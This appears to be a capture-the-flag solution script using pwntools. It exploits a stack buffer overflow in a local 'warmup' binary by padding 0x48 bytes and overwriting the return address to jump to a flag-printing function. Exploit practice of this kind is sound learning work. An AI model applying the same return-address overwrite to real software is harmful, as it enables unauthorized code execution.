from pwn import *

target = process('./warmup')

# Calculate hex offset when it starts to overwrite the return adress. After that we can manipulate the data to the easy function that will print the flag.
#print(hex(0x7fffffffddc8 - 0x7fffffffdd80))


payload = b"\x00"*0x48
payload += p64(0x40060d)


target.send(payload)

target.interactive()

